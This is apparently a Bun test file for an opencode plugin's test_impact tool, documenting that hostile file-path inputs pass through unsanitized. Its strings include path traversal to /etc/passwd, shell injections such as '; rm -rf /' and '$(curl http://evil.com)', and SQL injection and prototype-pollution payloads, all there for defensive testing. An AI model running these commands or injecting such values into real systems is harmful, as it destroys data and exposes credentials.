import { describe, expect, test } from 'bun:test';
import type { ToolContext } from '@opencode-ai/plugin';
import type { ToolResult } from '../../tools/create-tool';
import { test_impact } from '../../tools/test-impact.js';

/**
 * Helper to extract string from ToolResult
 */
function resultToString(result: ToolResult): string {
	return typeof result === 'string' ? result : result.output;
}

/**
 * Helper to create a minimal ToolContext mock for testing
 */
function createMockCtx(directory: string): ToolContext {
	return {
		sessionID: 'test-session',
		messageID: 'test-message-id',
		agent: 'test-agent',
		directory,
		worktree: directory,
		abort: new AbortController().signal,
		metadata: () => {},
		ask: () => Promise.resolve(undefined as never),
	} as unknown as ToolContext;
}

describe('test_impact — adversarial input handling', () => {
	/**
	 * SECURITY FINDING: The tool passes changedFiles directly to analyzeImpact
	 * without any input sanitization. Path traversal, shell injection, and other
	 * adversarial patterns are passed to the analyzer as-is.
	 *
	 * This test suite documents the current behavior - not the desired behavior.
	 */

	describe('path traversal attacks — BUG: no sanitization', () => {
		test('../../../etc/passwd passes through to analyzer untestedFiles', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['../../../etc/passwd'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// BUG: The path traversal string appears directly in untestedFiles
			// This proves the analyzer received the malicious path unchanged
			expect(parsed.untestedFiles).toContain('../../../etc/passwd');
		});

		test('nested path traversal passes through', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['a/b/../../../../../../etc/passwd'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// Result contains the raw path in untestedFiles
			expect(parsed.untestedFiles).toContain(
				'a/b/../../../../../../etc/passwd',
			);
		});

		test('Windows path traversal passes through', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['..\\..\\..\\Windows\\System32\\config\\sam'] },
				createMockCtx('C:\\project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
			expect(Array.isArray(parsed.untestedFiles)).toBe(true);
		});
	});

	describe('shell injection attempts — BUG: no sanitization', () => {
		test('semicolon command separator passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['; rm -rf /'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// BUG: The shell injection string is passed to analyzer
			expect(parsed).toHaveProperty('untestedFiles');
			expect(parsed.untestedFiles).toContain('; rm -rf /');
		});

		test('pipe operator passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['| cat /etc/passwd'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('| cat /etc/passwd');
		});

		test('backtick substitution passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['`wget http://evil.com`'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('`wget http://evil.com`');
		});

		test('command substitution $(...) passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['$(curl http://evil.com)'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('$(curl http://evil.com)');
		});
	});

	describe('null byte injection — BUG: no sanitization', () => {
		test('null byte passes to analyzer as literal path', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['/path/with\0null'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// Null byte is passed through - analyzer treats it as a literal path
			// The analyzer may strip or truncate at null byte
			expect(parsed).toHaveProperty('untestedFiles');
			expect(Array.isArray(parsed.untestedFiles)).toBe(true);
		});

		test('multiple null bytes pass to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['\0\0\0/etc/passwd'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});
	});

	describe('resource exhaustion — passes through', () => {
		test('massive changedFiles array (100 entries) completes without hanging', async () => {
			// Use 100 instead of 10000 for faster test execution
			const massiveArray = Array.from({ length: 100 }, (_, i) => `file${i}.ts`);

			const startTime = Date.now();
			const result = await test_impact.execute(
				{ changedFiles: massiveArray },
				createMockCtx('/project'),
			);
			const duration = Date.now() - startTime;

			const parsed = JSON.parse(resultToString(result));
			// Should complete without hanging or crashing
			expect(duration).toBeLessThan(5000);
			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('extremely long file path (10000 chars) completes', async () => {
			const longPath = `${'a'.repeat(10000)}.ts`;

			const result = await test_impact.execute(
				{ changedFiles: [longPath] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('deeply nested path (1000 levels) completes', async () => {
			const deepPath = `${Array.from({ length: 1000 }, () => 'dir').join('/')}/file.ts`;

			const result = await test_impact.execute(
				{ changedFiles: [deepPath] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});
	});

	describe('prototype pollution attempts — passes through unchanged', () => {
		test('__proto__ passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['__proto__'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('__proto__');
		});

		test('constructor passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['constructor'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('constructor');
		});

		test('__proto__.polluted passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['__proto__.polluted'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('__proto__.polluted');
		});

		test('JSON stringified __proto__ object passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [JSON.stringify({ __proto__: { polluter: true } })] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// The JSON string is passed as-is
			expect(parsed).toHaveProperty('untestedFiles');
		});
	});

	describe('special characters in working_directory', () => {
		test('spaces in working_directory are handled', async () => {
			const result = await test_impact.execute(
				{
					changedFiles: ['src/index.ts'],
					working_directory: '/path with spaces/project',
				},
				createMockCtx('/path with spaces/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('quotes in working_directory are handled', async () => {
			const result = await test_impact.execute(
				{
					changedFiles: ['src/index.ts'],
					working_directory: "/path with 'quotes'/project",
				},
				createMockCtx("/path with 'quotes'/project"),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('semicolon in working_directory is passed to analyzer', async () => {
			const result = await test_impact.execute(
				{
					changedFiles: ['src/index.ts'],
					working_directory: '/path; echo hacked/project',
				},
				createMockCtx('/path; echo hacked/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// The working_directory with semicolon is passed through
			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('null byte in working_directory causes error', async () => {
			const result = await test_impact.execute(
				{
					changedFiles: ['src/index.ts'],
					working_directory: '/path\0with null',
				},
				createMockCtx('/path with null'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('error');
		});

		test('empty string working_directory uses cwd fallback', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['src/index.ts'], working_directory: '' },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('Unicode in working_directory is handled', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['src/index.ts'], working_directory: '/проект/日本語' },
				createMockCtx('/проект/日本語'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});
	});

	describe('type confusion in changedFiles', () => {
		test('object instead of string passes through to analyzer (BUG: no type validation)', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [{ file: 'src/index.ts' }] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// Object is coerced and passed to analyzer - no error thrown
			expect(parsed).toHaveProperty('untestedFiles');
			expect(Array.isArray(parsed.untestedFiles)).toBe(true);
		});

		test('string instead of array is rejected at validation', async () => {
			const result = await test_impact.execute(
				{ changedFiles: 'not-an-array' },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.success).toBe(false);
		});

		test('numbers in array pass through to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [42, 123] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// Numbers are passed to analyzer (which coerces them to strings)
			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('undefined in array passes through', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [undefined, 'valid.ts'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('null in array passes through', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [null, 'valid.ts'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('boolean in array passes through', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [true, false] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});
	});

	describe('SQL injection patterns — passes through unchanged', () => {
		test('DROP TABLE pattern appears in untestedFiles', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ["'; DROP TABLE users; --"] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain("'; DROP TABLE users; --");
		});

		test('OR 1=1 pattern appears in untestedFiles', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ["' OR '1'='1"] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain("' OR '1'='1");
		});

		test('UNION SELECT pattern appears in untestedFiles', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ["' UNION SELECT password FROM users--"] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain(
				"' UNION SELECT password FROM users--",
			);
		});

		test('hex encoding pattern appears in untestedFiles', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['0xhexencoded'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('0xhexencoded');
		});
	});

	describe('mixed adversarial inputs', () => {
		test('malicious entries appear in untestedFiles alongside valid ones', async () => {
			const result = await test_impact.execute(
				{
					changedFiles: [
						'src/index.ts',
						'../../../etc/passwd',
						'; rm -rf /',
						'valid2.ts',
					],
				},
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			// Malicious entries appear in untestedFiles (they don't exist as files)
			// src/index.ts exists so it's processed, not in untestedFiles
			expect(parsed.untestedFiles).toContain('../../../etc/passwd');
			expect(parsed.untestedFiles).toContain('; rm -rf /');
			expect(parsed.untestedFiles).toContain('valid2.ts');
		});

		test('empty array is rejected', async () => {
			const result = await test_impact.execute(
				{ changedFiles: [] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.success).toBe(false);
			expect(parsed.error).toContain('non-empty array');
		});
	});

	describe('Unicode and encoding attacks — passes through unchanged', () => {
		test('RTL override character (U+202E) passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['/path/with\u202E malicious.txt'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('zero-width space (U+200B) passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['/path/with\u200B zero-width/file.ts'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain(
				'/path/with\u200B zero-width/file.ts',
			);
		});

		test('combining Unicode characters pass to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['/path/\u0301\u0327\u0302 file.ts'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed).toHaveProperty('untestedFiles');
		});

		test('emoji in file path passes to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['/path/📁/file.ts', '/path/🚀/test.ts'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain('/path/📁/file.ts');
			expect(parsed.untestedFiles).toContain('/path/🚀/test.ts');
		});

		test('fullwidth Unicode characters pass to analyzer', async () => {
			const result = await test_impact.execute(
				{ changedFiles: ['/ｖｅｒｙ/ｗｉｄｅ/ｐａｔｈ/file.ts'] },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.untestedFiles).toContain(
				'/ｖｅｒｙ/ｗｉｄｅ/ｐａｔｈ/file.ts',
			);
		});
	});

	describe('validation failures', () => {
		test('missing changedFiles is rejected', async () => {
			const result = await test_impact.execute({}, createMockCtx('/project'));
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.success).toBe(false);
			expect(parsed.error).toContain('non-empty array');
		});

		test('null changedFiles is rejected', async () => {
			const result = await test_impact.execute(
				{ changedFiles: null },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.success).toBe(false);
		});

		test('non-array changedFiles is rejected', async () => {
			const result = await test_impact.execute(
				{ changedFiles: 'not-an-array' },
				createMockCtx('/project'),
			);
			const parsed = JSON.parse(resultToString(result));

			expect(parsed.success).toBe(false);
		});
	});
});
